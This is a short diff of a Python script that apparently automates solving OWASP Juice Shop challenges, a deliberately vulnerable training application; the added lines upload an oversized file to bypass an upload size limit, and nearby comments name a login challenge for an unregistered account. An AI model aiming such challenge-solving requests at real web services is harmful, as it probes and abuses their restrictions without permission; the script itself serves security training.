@@ -31,6 +31,8 @@ requests.post(url+'/api/Users',data={'email':"aaaaaaa@juice-sh.op","password":"a
 requests.get(url+'/assets/public/images/padding/1px.png')
 # ---- Security Policy (Behave like any "white-hat" should before getting into the action.)
 requests.get(url+'/.well-known/security.txt')
+# ---- Upload Size (Upload a file larger than 100 kB.)
+requests.post(url+'/file-upload', files={'file':open('file-upload/Upload Size.pdf','rb')})
 
 # ==== No required action - Login challenges ====
 # ---- Ephemeral Accountant (Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.)
